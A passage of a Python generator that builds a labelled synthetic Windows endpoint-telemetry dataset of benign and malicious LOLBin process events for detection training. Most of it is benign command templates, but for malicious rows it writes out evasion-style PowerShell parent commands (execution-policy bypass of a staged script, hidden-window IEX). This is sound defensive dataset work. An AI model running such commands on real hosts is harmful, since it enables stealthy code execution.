            rf'excel.exe /automation "C:\\Users\\{user}\\Documents\\Inventory_{name}.xlsx"',
        ],
        "outlook.exe": [
            r'outlook.exe /recycle',
            r'outlook.exe /embedding',
        ],
        "teams.exe": [
            r'teams.exe --processStart Teams.exe',
            r'teams.exe --type=renderer',
        ],
        "onedrive.exe": [
            r'OneDrive.exe /background',
            r'OneDrive.exe /sync',
        ],
        "svchost.exe": [
            r'svchost.exe -k netsvcs -p',
            r'svchost.exe -k LocalServiceNetworkRestricted -p',
            r'svchost.exe -k DcomLaunch -p',
        ],
        "services.exe": [
            r'services.exe',
        ],
        "spoolsv.exe": [
            r'spoolsv.exe',
        ],
        "dllhost.exe": [
            r'dllhost.exe /Processid:{00000000-0000-0000-0000-000000000000}',
        ],
        "powershell.exe": [
            r'powershell.exe -NoProfile -Command "Get-Service | Select-Object -First 10"',
            r'powershell.exe -NoProfile -File "C:\Program Files\CONTOSO\Scripts\inventory.ps1"',
            r'powershell.exe -NoProfile -WindowStyle Normal -Command "Get-EventLog -LogName System -Newest 20"',
            r'powershell.exe -NoProfile -NonInteractive -ExecutionPolicy RemoteSigned -Command "Get-ComputerInfo | Select-Object WindowsProductName"',
        ],
        "cmd.exe": [
            r'cmd.exe /c dir C:\Windows\Temp',
            r'cmd.exe /c whoami',
            r'cmd.exe /c ipconfig /all',
        ],
        "certutil.exe": [
            rf'certutil.exe -hashfile "C:\\Users\\{user}\\Downloads\\installer_{name}.msi" SHA256',
            r'certutil.exe -store My',
        ],
        "bitsadmin.exe": [
            r'bitsadmin.exe /list /allusers',
        ],
        "reg.exe": [
            r'reg.exe query HKLM\Software\Microsoft\Windows\CurrentVersion\Run',
            r'reg.exe query HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer',
        ],
        "schtasks.exe": [
            r'schtasks.exe /Query /FO LIST /V',
            r'schtasks.exe /Query /TN "Microsoft\Windows\Defrag\ScheduledDefrag"',
        ],
        "wmic.exe": [
            r'wmic.exe os get Caption,Version,BuildNumber',
            r'wmic.exe logicaldisk get name,freespace,size',
        ],
        "msiexec.exe": [
            rf'msiexec.exe /i "C:\\Program Files\\CONTOSO\\Installers\\Agent_{name}.msi" /qn',
            r'msiexec.exe /x {11111111-2222-3333-4444-555555555555} /qn',
            r'msiexec.exe /help',
        ],
        "rundll32.exe": [
            r'rundll32.exe shell32.dll,Control_RunDLL',
            r'rundll32.exe shdocvw.dll,OpenURL C:\Windows\system32\license.rtf',
            rf'rundll32.exe {SYSTEM32}\shimgvw.dll,ImageView_Fullscreen "{PUBLIC}\photo_{name}.png"',
        ],
        "regsvr32.exe": [
            rf'regsvr32.exe /s "{SYSTEM32}\scrrun.dll"',
            rf'regsvr32.exe /s "{SYSTEM32}\vbscript.dll"',
        ],
        "mshta.exe": [
            r'mshta.exe "about:<html><head><hta:application singleinstance=yes></head><body></body></html>"',
            rf'mshta.exe "{SYSTEM32}\iesetup\itelayer.hta"',
        ],
        "msbuild.exe": [
            r"msbuild.exe /version",
            r"msbuild.exe /help",
        ],
        "installutil.exe": [
            r"installutil.exe /?",
            r"installutil.exe /help",
        ],
        "wscript.exe": [
            rf'wscript.exe "{SYSTEM32}\slmgr.vbs" //B',
        ],
        "cscript.exe": [
            rf'cscript.exe //nologo "{SYSTEM32}\slmgr.vbs" /dli',
        ],
        "hh.exe": [
            rf'hh.exe ms-its:{SYSTEM32}\certmgr.chm::/html/hxwelcome.htm',
        ],
    }
    return variabilize_invocation(random.choice(templates[process_name]))


def benign_command_for_entry(entry: Dict[str, Any]) -> str:
    """Benign operator-style command for any LOLBAS catalog Name, using API path when available."""
    name_obj = entry.get("Name")
    name = name_obj if isinstance(name_obj, str) else "binary.exe"
    key = name.lower()
    path = pick_process_image_path(name, entry)

    if key.endswith(".ps1"):
        return variabilize_invocation(
            rf'powershell.exe -NoProfile -NonInteractive -Command '
            rf'"(Get-Command -Syntax ''{path}'') -ne $null | Out-Null"'
        )
    if key.endswith(".vbs") or key.endswith(".wsf"):
        return variabilize_invocation(
            random.choice(
                [
                    rf'cscript.exe //nologo "{path}"',
                    rf'wscript.exe "{path}" //B',
                ]
            )
        )
    if key.endswith(".bat"):
        return variabilize_invocation(rf'cmd.exe /c type "{path}"')
    if key.endswith(".dll"):
        return variabilize_invocation(
            random.choice(
                [
                    rf'rundll32.exe "{path}",DllRegisterServer',
                    rf'rundll32.exe "{path}",DllUnregisterServer',
                ]
            )
        )
    if key.endswith(".cpl"):
        return variabilize_invocation(rf'control.exe "{path}"')

    if key in {
        "explorer.exe",
        "chrome.exe",
        "msedge.exe",
        "winword.exe",
        "excel.exe",
        "outlook.exe",
        "teams.exe",
        "onedrive.exe",
        "svchost.exe",
        "services.exe",
        "spoolsv.exe",
        "dllhost.exe",
        "powershell.exe",
        "cmd.exe",
        "certutil.exe",
        "bitsadmin.exe",
        "reg.exe",
        "schtasks.exe",
        "wmic.exe",
        "msiexec.exe",
        "rundll32.exe",
        "regsvr32.exe",
        "mshta.exe",
        "msbuild.exe",
        "installutil.exe",
        "wscript.exe",
        "cscript.exe",
        "hh.exe",
    }:
        return benign_command(key)

    if key.endswith(".exe"):
        return variabilize_invocation(
            random.choice(
                [
                    f'"{path}" /?',
                    f'"{path}" -h',
                    f'"{path}" /help',
                    f'"{path}"',
                ]
            )
        )
    return variabilize_invocation(f'"{path}"')


def sample_generic_benign_command() -> tuple[str, str, str]:
    """Benign activity not tied to LOLBAS rows: desktop apps, browsers, admin tools (JSONL-adjacent mix)."""
    u = rand_user_short()
    h = rand_hex(4)
    m = rand_hex(6)

    chrome_path = r"C:\Program Files\Google\Chrome\Application\chrome.exe"
    edge_path = r"C:\Program Files\Microsoft\Edge\Application\msedge.exe"
    code_path = rf"C:\Users\{u}\AppData\Local\Programs\Microsoft VS Code\Code.exe"

    samples: list[tuple[str, str, str]] = [
        ("notepad.exe", f"{SYSTEM32}\\notepad.exe", f'notepad.exe "C:\\Users\\{u}\\Documents\\scratch_{h}.txt"'),
        ("notepad.exe", f"{SYSTEM32}\\notepad.exe", rf'notepad.exe C:\Users\{u}\Desktop\readme_{h}.txt'),
        ("calc.exe", f"{SYSTEM32}\\calc.exe", "calc.exe"),
        ("mspaint.exe", f"{SYSTEM32}\\mspaint.exe", f'mspaint.exe "C:\\Users\\Public\\share_{h}.png"'),
        ("write.exe", f"{SYSTEM32}\\write.exe", f'write.exe "C:\\Users\\{u}\\Documents\\memo_{h}.rtf"'),
        ("SnippingTool.exe", f"{SYSTEM32}\\SnippingTool.exe", random.choice(["SnippingTool.exe /clip", "SnippingTool.exe"])),
        ("chrome.exe", chrome_path, random.choice([
            rf'"{chrome_path}" https://learn.microsoft.com/en-us/windows/',
            rf'"{chrome_path}" --type=gpu-process --gpu-preferences=UAAAAAAAAADgAAAYAAAAAAAAAAAAAAAAAABgAAAAAAAwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAegAAAAA',
            "chrome.exe --type=renderer --lang=en-GB --instant-process",
        ])),
        ("msedge.exe", edge_path, random.choice([
            rf'"{edge_path}" https://www.wikipedia.org/wiki/Main_Page',
            r"msedge.exe --no-startup-window --win-session-start",
        ])),
        ("Code.exe", code_path, rf'"{code_path}" "C:\Users\{u}\source\corp-portal\README.md"'),
        ("WindowsTerminal.exe", rf"C:\Users\{u}\AppData\Local\Microsoft\WindowsApps\wt.exe", rf'wt.exe -d C:\Users\{u}\Documents'),
        ("taskmgr.exe", f"{SYSTEM32}\\taskmgr.exe", random.choice(["taskmgr.exe /0", "taskmgr.exe"])),
        ("dwm.exe", f"{SYSTEM32}\\dwm.exe", "C:\\Windows\\System32\\dwm.exe"),
        ("sihost.exe", f"{SYSTEM32}\\sihost.exe", f"{SYSTEM32}\\sihost.exe"),
        ("fontdrvhost.exe", f"{SYSTEM32}\\fontdrvhost.exe", f"{SYSTEM32}\\fontdrvhost.exe"),
        ("whoami.exe", f"{SYSTEM32}\\whoami.exe", random.choice(["whoami.exe /groups", "whoami.exe /claims"])),
        ("Ipconfig.exe", f"{SYSTEM32}\\ipconfig.exe", random.choice(["ipconfig.exe /all", "ipconfig.exe /flushdns"])),
        ("systeminfo.exe", f"{SYSTEM32}\\systeminfo.exe", "systeminfo.exe"),
        ("gpresult.exe", f"{SYSTEM32}\\gpresult.exe", rf"gpresult.exe /Scope Computer /R"),
        ("dsregcmd.exe", f"{SYSTEM32}\\dsregcmd.exe", random.choice(["dsregcmd.exe /status", "dsregcmd.exe /debug"])),
        ("Robocopy.exe", f"{SYSTEM32}\\Robocopy.exe", rf'robocopy.exe "C:\Users\{u}\Documents\Reports" "\\FILE-SRV-02\users\{u}\backup" /MIR /R:1 /W:1 /MT:8'),
        ("xcopy.exe", f"{SYSTEM32}\\xcopy.exe", rf'xcopy.exe "C:\Users\{u}\Desktop\*.pdf" "D:\Archives\" /Y /I'),
    ]
    name, img, cmd = random.choice(samples)
    return name, img, variabilize_invocation(cmd)


def benign_activity_rationale(process_name: str, command_line: str, source: str) -> str:
    """Why this activity is expected benign on a corporate endpoint (analyst / user narrative)."""
    pn = process_name.lower()
    cmd = command_line.lower()

    generic_rationale: Dict[str, str] = {
        "notepad.exe": (
            "End user opens or edits a local text file via Notepad launched from Explorer; "
            "standard desk-side work with no encoded payload, remote fetch, or persistence write."
        ),
        "calc.exe": (
            "Built-in calculator started interactively; common ad-hoc use with no command-line "
            "arguments that stage secondary tooling."
        ),
        "mspaint.exe": (
            "User views or edits an image through mspaint; local file access only, consistent with "
            "creative or documentation tasks."
        ),
        "write.exe": (
            "Legacy WordPad opens a local RTF/document; normal productivity, not a proxy execution chain."
        ),
        "snippingtool.exe": (
            "Screen capture utility invoked for documentation or support tickets; no network staging "
            "or script host involvement."
        ),
        "chrome.exe": (
            "Browser starts or spawns a renderer/GPU child for HTTPS browsing to public documentation "
            "or SaaS; aligns with approved web use, not a download cradle for unsigned binaries."
        ),
        "msedge.exe": (
            "Microsoft Edge session for legitimate browsing or startup housekeeping; traffic targets "
            "enterprise-allowlisted web properties when network is observed."
        ),
        "code.exe": (
            "Developer opens a repository file in VS Code from a user profile path; expected software "
            "development workflow without LOLBin-style execution primitives."
        ),
        "windowsterminal.exe": (
            "User opens Windows Terminal in a documents directory for routine CLI work; parent is "
            "Explorer or Terminal host, not an Office LOLBin chain."
        ),
        "taskmgr.exe": (
            "Interactive Task Manager for performance review or ending a hung application; "
            "administrative GUI use without spawning suspicious children."
        ),
        "dwm.exe": "Desktop Window Manager session compositor; core shell component, always benign baseline.",
        "sihost.exe": "Shell Infrastructure Host supporting Start/menu UX; normal logon-session activity.",
        "fontdrvhost.exe": "Font driver host for the interactive session; baseline Windows graphics stack.",
        "whoami.exe": (
            "User or helpdesk verifies group membership or claims after logon; read-only identity "
            "check, not credential dumping."
        ),
        "ipconfig.exe": (
            "Operator inspects or refreshes network configuration during connectivity troubleshooting; "
            "no remote payload retrieval."
        ),
        "systeminfo.exe": (
            "Host inventory command for support or asset verification; outputs OS metadata locally "
            "without executing downloaded content."
        ),
        "gpresult.exe": (
            "IT validates Group Policy application on the machine; standard enterprise hygiene during "
            "ticket investigation."
        ),
        "dsregcmd.exe": (
            "Azure AD / hybrid join status check; common during device compliance or SSO troubleshooting."
        ),
        "robocopy.exe": (
            "User or backup job copies files to an internal file server share using documented switches; "
            "data movement stays inside corporate UNC paths."
        ),
        "xcopy.exe": (
            "Simple file copy to a local archive drive; routine user backup behavior without alternate "
            "data streams or script execution."
        ),
    }
    if source == "generic_benign" and pn in generic_rationale:
        return generic_rationale[pn]

    if any(x in cmd for x in ("/?", " /help", " -help", " /h ", " -h ")):
        return (
            f"Operator invokes documented help or usage output for {process_name}; read-only "
            "introspection with no download, decode, or persistence side effects."
        )
    if "regsvr32" in cmd and "/s" in cmd and "system32" in cmd:
        return (
            "Maintenance or installer registers a Microsoft-supplied system library silently; "
            "targets well-known System32 paths, not a remote scriptlet or user-writable staging folder."
        )
    if "rundll32" in cmd and any(
        x in cmd for x in ("control_rundll", "dllregisterserver", "dllunregisterserver", "license.rtf")
    ):
        return (
            "Control Panel or shell helper invoked through rundll32 for a built-in DLL entry point; "
            "matches admin or user configuration tasks, not remote script execution."
        )
    if "powershell" in cmd and any(
        x in cmd for x in ("get-service", "get-eventlog", "get-computerinfo", "get-scheduledtask")
    ):
        return (
            "Signed PowerShell runs a short, transparent inventory cmdlet with NoProfile; "
            "typical automation or helpdesk script, not encoded bypass or IEX from the internet."
        )
    if "wmic" in cmd and " get " in cmd:
        return (
            "Legacy WMIC query for OS or disk facts during troubleshooting; read-only WMI class "
            "enumeration without process create to remote hosts."
        )
    if "msiexec" in cmd and ("/i " in cmd or "/qn" in cmd):
        return (
            "Software deployment installs or removes a package from Program Files or a known MSI "
            "product code; aligns with change management, not quiet install from a paste URL."
        )
    if "schtasks" in cmd and "/query" in cmd:
        return (
            "Administrator lists scheduled tasks for auditing or troubleshooting; query-only, "
            "not task creation with a suspicious /TR payload."
        )
    if "certutil" in cmd and ("-hashfile" in cmd or "-store" in cmd):
        return (
            "User verifies installer integrity or inspects certificate store; legitimate security "
            "hygiene distinct from -urlcache download patterns."
        )
    if "bitsadmin" in cmd and "/list" in cmd:
        return "Operator audits Background Intelligent Transfer jobs; enumeration only, no transfer job creation."

    if source == "lolbas_benign":
        return (
            f"LOLBAS-capable binary {process_name} is used within its intended or common administrative "
            "role on this host: no remote URL, encoded command, or Run-key persistence is present in "
            "the command line."
        )
    return (
        f"Activity matches baseline enterprise use of {process_name}: signed image, local or approved "
        "paths, and command-line arguments that do not chain to payload delivery or defense evasion."
    )


def benign_activity_outcome(process_name: str, command_line: str, source: str) -> str:
    """How the session would look to SOC / IT in a normal day (benign timeline)."""
    pn = process_name.lower()
    cmd = command_line.lower()
    stages: List[str] = []

    if pn in {"notepad.exe", "write.exe", "mspaint.exe", "calc.exe", "snippingtool.exe"}:
        stages.append("User completes local desk-side task under Explorer")
    elif pn in {"winword.exe", "excel.exe", "outlook.exe", "powerpnt.exe"}:
        stages.append("Office opens a user document or mailbox session for productivity")
    elif pn in {"chrome.exe", "msedge.exe", "teams.exe", "onedrive.exe"}:
        stages.append("Approved client reaches corporate or public HTTPS endpoints")
    elif pn in {"code.exe", "windowsterminal.exe"}:
        stages.append("Developer or operator uses CLI/IDE in a profile-owned directory")
    elif pn in {"whoami.exe", "ipconfig.exe", "systeminfo.exe", "gpresult.exe", "dsregcmd.exe"}:
        stages.append("Support gathers host identity or policy state for a ticket")
    elif pn in {"robocopy.exe", "xcopy.exe"}:
        stages.append("Files sync to internal share or local archive without execution side effects")
    elif pn in {"powershell.exe", "pwsh.exe"} and "get-" in cmd:
        stages.append("Read-only PowerShell inventory for monitoring or troubleshooting")
    elif pn in {"wmic.exe", "sc.exe", "reg.exe", "schtasks.exe"} and (
        "query" in cmd or " get " in cmd or "/?" in cmd
    ):
        stages.append("Administrative query against WMI, services, registry, or tasks")
    elif any(x in cmd for x in ("/?", "/help", " -h")):
        stages.append("Operator confirms syntax before planned maintenance")
    elif "regsvr32" in cmd or ("rundll32" in cmd and "system32" in cmd):
        stages.append("System component registration or Control Panel action completes locally")
    else:
        stages.append("Signed Windows utility runs with expected parent and arguments")

    stages.append("No secondary download, encoded execution, or Run-key write in the same chain")
    return " → ".join(stages[:3])


def attach_benign_narrative(
    enrichment: Dict[str, str],
    process_name: str,
    command_line: str,
    source: str,
) -> None:
    enrichment["command_source"] = source
    enrichment["attack_rationale"] = benign_activity_rationale(process_name, command_line, source)
    enrichment["attack_outcome"] = benign_activity_outcome(process_name, command_line, source)


def benign_enrichment(process_name: str) -> Dict[str, str]:
    pn = process_name.lower()
    network_processes = {
        "chrome.exe",
        "msedge.exe",
        "msedge_proxy.exe",
        "msedgewebview2.exe",
        "outlook.exe",
        "teams.exe",
        "onedrive.exe",
        "svchost.exe",
        "winword.exe",
        "excel.exe",
        "powerpnt.exe",
        "winproj.exe",
    }
    file_copy_net = pn in {"robocopy.exe", "xcopy.exe"} and random.random() < 0.5
    destination = ""
    if pn in {"outlook.exe", "teams.exe", "onedrive.exe"}:
        destination = random.choice(
            [
                "https://login.microsoftonline.com/",
                "https://graph.microsoft.com/",
            ]
        )
    elif pn in {"chrome.exe", "msedge.exe"}:
        destination = random.choice(
            [
                "https://learn.microsoft.com/",
                "https://www.wikipedia.org/",
                "https://www.bing.com/",
            ]
        )
    elif file_copy_net:
        destination = rf"\\FILE-SRV-02.contoso.lab\users\{rand_user_short()}\share"
    elif pn in {"winword.exe", "excel.exe", "powerpnt.exe", "winproj.exe"} and random.random() < 0.35:
        destination = "https://graph.microsoft.com/"

    network = bool(destination) or (pn in {"svchost.exe"} and random.random() < 0.15)

    categories = [
        "standard_user_activity",
        "administrative_query",
        "software_update",
        "office_productivity",
        "system_service",
        "help_or_usage",
        "inventory_or_repair",
    ]
    if pn in {"notepad.exe", "calc.exe", "mspaint.exe", "write.exe", "chrome.exe", "msedge.exe"}:
        rule_cat = random.choice(
            ["standard_user_activity", "office_productivity", "standard_user_activity"]
        )
    elif pn in {"whoami.exe", "ipconfig.exe", "systeminfo.exe", "gpresult.exe", "dsregcmd.exe"}:
        rule_cat = random.choice(["administrative_query", "inventory_or_repair"])
    elif pn in {"robocopy.exe", "xcopy.exe"}:
        rule_cat = random.choice(["standard_user_activity", "administrative_query"])
    else:
        rule_cat = random.choice(categories)

    return {
        "network_connection": "true" if network else "false",
        "destination": destination,
        "file_write_path": random.choice(["", "", r"C:\Users\Public\cache_read.tmp"]),
        "registry_key": "",
        "rule_category": rule_cat,
        "mitre_technique": "",
        "severity": random.choice(BENIGN_SEVERITIES),
    }


def pick_integrity_for_user(username: str, parent_process: str) -> str:
    u = username.upper()
    pp = parent_process.lower()
    if pp in {"services.exe", "wininit.exe", "csrss.exe"}:
        return random.choice(["System", "System", "High"])
    if "SVC_" in u or u.endswith("DEPLOY") or u.endswith("BACKUP"):
        return random.choice(["Medium", "High", "High", "System"])
    return random.choice(["Medium", "Medium", "Medium", "Medium", "High"])


def pick_realistic_parent_and_cmdline(process_name: str, label: int) -> tuple[str, str]:
    """Correlated parent image and parent command line."""
    pn = process_name.lower()
    if label == 0:
        if pn == "svchost.exe":
            parent = "services.exe"
        elif pn in {"dllhost.exe", "taskhostw.exe", "sihost.exe", "fontdrvhost.exe", "runtimebroker.exe"}:
            parent = random.choice(["svchost.exe", "services.exe", "sihost.exe", "winlogon.exe"])
        elif pn == "dwm.exe":
            parent = random.choice(["winlogon.exe", "svchost.exe"])
        elif pn in {
            "winword.exe",
            "excel.exe",
            "outlook.exe",
            "teams.exe",
            "notepad.exe",
            "calc.exe",
            "mspaint.exe",
            "write.exe",
        }:
            parent = random.choice(["explorer.exe"] * 5 + ["runtimebroker.exe"])
        elif pn in {"chrome.exe", "msedge.exe", "code.exe"}:
            parent = random.choice(["explorer.exe"] * 4 + ["sihost.exe"])
        elif pn in {"powershell.exe", "cmd.exe"}:
            parent = random.choice(["explorer.exe", "cmd.exe", "powershell.exe", "taskeng.exe"])
        else:
            parent = random.choice(PARENTS)
    else:
        if pn.endswith(".dll") or pn.endswith(".cpl"):
            parent = random.choice(
                ["rundll32.exe", "explorer.exe", "cmd.exe", "powershell.exe", "winword.exe"]
            )
        elif pn in {"powershell.exe", "pwsh.exe"}:
            parent = random.choice(
                ["cmd.exe", "explorer.exe", "winword.exe", "excel.exe", "taskeng.exe", "wscript.exe"]
            )
        elif pn == "cmd.exe":
            parent = random.choice(
                ["explorer.exe", "powershell.exe", "taskeng.exe", "winword.exe", "schtasks.exe"]
            )
        elif pn in {"rundll32.exe", "regsvr32.exe", "certutil.exe", "bitsadmin.exe", "mshta.exe"}:
            parent = random.choice(
                ["cmd.exe", "powershell.exe", "explorer.exe", "svchost.exe", "wscript.exe"]
            )
        elif pn in {"wscript.exe", "cscript.exe"}:
            parent = random.choice(["explorer.exe", "wscript.exe", "cmd.exe", "outlook.exe"])
        else:
            parent = random.choice(PARENTS)

    p_low = parent.lower()
    if p_low == "explorer.exe":
        cmdln = random.choice(
            [
                "explorer.exe",
                r"C:\Windows\explorer.exe",
                r'"C:\Windows\SysWOW64\explorer.exe"',
            ]
        )
    elif p_low == "services.exe":
        cmdln = r"C:\Windows\System32\services.exe"
    elif p_low == "svchost.exe":
        cmdln = random.choice(
            [
                "svchost.exe -k netsvcs -p",
                "svchost.exe -k DcomLaunch -p",
                r"C:\Windows\System32\svchost.exe -k NetworkService",
            ]
        )
    elif p_low == "cmd.exe":
        cmdln = random.choice(["cmd.exe", r"C:\Windows\System32\cmd.exe"])
    elif p_low == "powershell.exe":
        if label == 0:
            cmdln = random.choice(
                [
                    r'powershell.exe -NoProfile -Command "Get-ScheduledTask | Select-Object -First 5"',
                    r"powershell.exe -NoProfile -ExecutionPolicy RemoteSigned -File C:\ProgramData\CONTOSO\inventory.ps1",
                ]
            )
        else:
            cmdln = random.choice(
                [
                    r"powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\Users\Public\stage.ps1",
                    r'powershell.exe -NoP -W Hidden -Command "IEX (Get-Content .\cfg.txt -Raw)"',
                ]
            )
    else:
        cmdln = parent
    return parent, cmdln


def make_record(
    row_id: int,
    label: int,
    process_name: str,
    process_path: str,
    command_line: str,
    enrichment: Dict[str, str],
    base_time: datetime,
) -> Dict[str, str]:
    host = random.choice(HOSTS)
    user = random.choice(USERS)
    parent, parent_cmdline = pick_realistic_parent_and_cmdline(process_name, label)
    integrity = pick_integrity_for_user(user, parent)
    return {
        "event_id": f"EVT-{row_id:06d}",
        "timestamp_utc": random_timestamp(base_time),
        "host": host,
        "username": user,
        "parent_process": parent,
        "parent_command_line": parent_cmdline,
        "process_name": process_name,
        "process_path": process_path,
        "command_line": command_line,
        "raw_event": f'host="{host}" user="{user}" parent="{parent}" image="{process_path}" command_line="{command_line}"',
        "integrity_level": integrity,
        "signed": "true",
        "network_connection": enrichment["network_connection"],
        "destination": enrichment["destination"],
        "file_write_path": enrichment["file_write_path"],
        "registry_key": enrichment["registry_key"],
        "rule_category": enrichment["rule_category"],
        "mitre_technique": enrichment["mitre_technique"],
        "severity": enrichment["severity"],
        "label": str(label),
        "command_source": enrichment.get("command_source", ""),
        "attack_rationale": enrichment.get("attack_rationale", ""),
        "attack_outcome": enrichment.get("attack_outcome", ""),
    }


# Explicit CSV schema: no class, dataset_note, or other metadata columns in the header.
CSV_FIELDNAMES: tuple[str, ...] = (
    "event_id",
    "timestamp_utc",
    "host",
    "username",
    "parent_process",
    "parent_command_line",
    "process_name",
    "process_path",
    "command_line",
    "command_source",
    "attack_rationale",
    "attack_outcome",
    "raw_event",
    "integrity_level",
    "signed",
    "network_connection",
    "destination",
    "file_write_path",
    "registry_key",
    "rule_category",
    "mitre_technique",
    "severity",
    "label",
)


def _generate_lolbin_from_lolbas(
    entries: List[Dict[str, Any]],
) -> tuple[str, str, str, Dict[str, str]]:
    entry = random.choice(entries)
    name = str(entry.get("Name", "unknown.exe"))
    cmds = [
        c for c in (entry.get("Commands") or []) if isinstance(c, dict) and c.get("Command")
    ]
    mitre = ""
    source = "lolbas"
    if cmds and random.random() < 0.82:
        cobj = random.choice(cmds)
        command = instantiate_lolbas_command(str(cobj["Command"]))
        mitre = str(cobj.get("MitreID") or "")
    else:
        tk = template_key_for_entry_name(name)
        if tk:
            command = suspicious_command(tk)
            source = "template"
        elif cmds:
            cobj = random.choice(cmds)
            command = instantiate_lolbas_command(str(cobj["Command"]))
            mitre = str(cobj.get("MitreID") or "")
        else:
            command = f'"{pick_process_image_path(name, entry)}"'
    enrichment = suspicious_enrichment(name, mitre)
    rationale, outcome = lolbas_attack_narrative(mitre, enrichment["rule_category"])
    enrichment["command_source"] = source
    enrichment["attack_rationale"] = rationale
    enrichment["attack_outcome"] = outcome
    img = pick_process_image_path(name, entry)
    return name, img, command, enrichment


def _generate_lolbin_from_liblol(
    liblol_rows: List[Dict[str, str]],
    lolbas_entries: List[Dict[str, Any]],
    *,
    variant_id: Optional[int] = None,
) -> tuple[str, str, str, Dict[str, str]]:
    row = random.choice(liblol_rows)
    prompt = row["prompt"]
    if variant_id is not None:
        prompt = uniquify_liblol_prompt(prompt, variant_id)
    command = instantiate_liblol_command(prompt)
    rationale = normalize_attack_rationale(row["response"])
    outcome = summarize_attack_outcome(row["response"])
    name = extract_process_name_from_command(command)
    entry = find_lolbas_entry_for_name(name, lolbas_entries)
    mitre = ""
    if entry:
        cmds = entry.get("Commands") or []
        if isinstance(cmds, list) and cmds:
            mitre = str((cmds[0] or {}).get("MitreID") or "")
    enrichment = suspicious_enrichment_liblol(name, command, row["response"], mitre)
    enrichment["command_source"] = "liblol"
    enrichment["attack_rationale"] = rationale
    enrichment["attack_outcome"] = outcome
    img = pick_process_image_path(name, entry) if entry else choose_path(name)
    return name, img, command, enrichment


def _register_unique_command(
    registry: UniqueCommandRegistry,
    label: int,
    process_name: str,
    command_line: str,
) -> bool:
    return registry.register(label, process_name, command_line)


def _sample_malicious_catalog(
    lolbas_entries: List[Dict[str, Any]],
    liblol_rows: List[Dict[str, str]],
    *,
    variant_id: Optional[int] = None,
) -> tuple[str, str, str, Dict[str, str]]:
    use_liblol = bool(liblol_rows)
    if use_liblol and random.random() < LIBLOL_MALICIOUS_FRACTION:
        return _generate_lolbin_from_liblol(
            liblol_rows, lolbas_entries, variant_id=variant_id
        )
    return _generate_lolbin_from_lolbas(lolbas_entries)


def _sample_benign_catalog(entries: List[Dict[str, Any]]) -> tuple[str, str, str, Dict[str, str]]:
    if random.random() < GENERIC_BENIGN_FRACTION:
        name, img, command = sample_generic_benign_command()
        enrichment = benign_enrichment(name)
        attach_benign_narrative(enrichment, name, command, "generic_benign")
        return name, img, command, enrichment
    entry = random.choice(entries)
    name = str(entry.get("Name", "unknown.exe"))
    command = benign_command_for_entry(entry)
    enrichment = benign_enrichment(name)
    attach_benign_narrative(enrichment, name, command, "lolbas_benign")
    img = pick_process_image_path(name, entry)
    return name, img, command, enrichment


def _malicious_parametric_enrichment(process_name: str, command_line: str) -> Dict[str, str]:
    entry = find_lolbas_entry_for_name(process_name, get_lolbas_entries())
    mitre = ""
    if entry:
        cmds = entry.get("Commands") or []
        if isinstance(cmds, list) and cmds:
            mitre = str((cmds[0] or {}).get("MitreID") or "")
    enrichment = suspicious_enrichment(process_name, mitre)
    enrichment["command_source"] = "parametric"
    rationale, outcome = lolbas_attack_narrative(mitre, enrichment["rule_category"])
    enrichment["attack_rationale"] = rationale
    enrichment["attack_outcome"] = outcome
    return enrichment


def _emit_unique_malicious(
    registry: UniqueCommandRegistry,
    row_id: int,
    base_time: datetime,
    lolbas_entries: List[Dict[str, Any]],
    liblol_rows: List[Dict[str, str]],
    *,
    parametric_index: int,
) -> tuple[Dict[str, str], int]:
    catalog_attempts = 40 if len(registry) < 250_000 else 0
    for attempt in range(catalog_attempts):
        variant_id = None if attempt < 20 else parametric_index + attempt
        name, img, command, enrichment = _sample_malicious_catalog(
            lolbas_entries, liblol_rows, variant_id=variant_id
        )
        if _register_unique_command(registry, 1, name, command):
            return make_record(row_id, 1, name, img, command, enrichment, base_time), parametric_index

    while parametric_index < 50_000_000:
        name, img, command = malicious_command_at_index(parametric_index)
        parametric_index += 1
        if not _register_unique_command(registry, 1, name, command):
            continue
        enrichment = _malicious_parametric_enrichment(name, command)
        return make_record(row_id, 1, name, img, command, enrichment, base_time), parametric_index

    raise RuntimeError(f"Could not emit unique malicious row at id={row_id}")


def _emit_unique_benign(
    registry: UniqueCommandRegistry,
    row_id: int,
    base_time: datetime,
    lolbas_entries: List[Dict[str, Any]],
    *,
    parametric_index: int,
) -> tuple[Dict[str, str], int]:
    catalog_attempts = 40 if len(registry) < 400_000 else 0
    for _ in range(catalog_attempts):
        name, img, command, enrichment = _sample_benign_catalog(lolbas_entries)
        if _register_unique_command(registry, 0, name, command):
            return make_record(row_id, 0, name, img, command, enrichment, base_time), parametric_index

    while parametric_index < 50_000_000:
        name, img, command = benign_command_at_index(parametric_index)
        parametric_index += 1
        if not _register_unique_command(registry, 0, name, command):
            continue
        enrichment = benign_enrichment(name)
        attach_benign_narrative(enrichment, name, command, "parametric_benign")
        return make_record(row_id, 0, name, img, command, enrichment, base_time), parametric_index

    raise RuntimeError(f"Could not emit unique benign row at id={row_id}")


def generate_lolbin_records(
    n: int,
    start_id: int,
    base_time: datetime,
    registry: UniqueCommandRegistry,
    *,
    parametric_index: int = 0,
) -> tuple[List[Dict[str, str]], int]:
    records: List[Dict[str, str]] = []
    lolbas_entries = get_lolbas_entries()
    liblol_rows = get_liblol_entries()
    for i in range(n):
        record, parametric_index = _emit_unique_malicious(
            registry,
            start_id + i,
            base_time,
            lolbas_entries,
            liblol_rows,
            parametric_index=parametric_index,
        )
        records.append(record)
    return records, parametric_index


def generate_benign_records(
    n: int,
    start_id: int,
    base_time: datetime,
    registry: UniqueCommandRegistry,
    *,
    parametric_index: int = 0,
) -> tuple[List[Dict[str, str]], int]:
    records: List[Dict[str, str]] = []
    lolbas_entries = get_lolbas_entries()
    for i in range(n):
        record, parametric_index = _emit_unique_benign(
            registry,
            start_id + i,
            base_time,
            lolbas_entries,
            parametric_index=parametric_index,
        )
        records.append(record)
    return records, parametric_index


def write_csv(path: Path, rows: List[Dict[str, str]]) -> None:
    if not rows:
        raise ValueError("No rows supplied")
    with path.open("w", newline="", encoding="utf-8") as f:
        writer = csv.DictWriter(
            f,
            fieldnames=list(CSV_FIELDNAMES),
            extrasaction="ignore",
        )
        writer.writeheader()
        for row in rows:
            writer.writerow({k: row[k] for k in CSV_FIELDNAMES})


def _append_csv_rows(path: Path, rows: List[Dict[str, str]], *, write_header: bool) -> None:
    mode = "w" if write_header else "a"
    with path.open(mode, newline="", encoding="utf-8") as f:
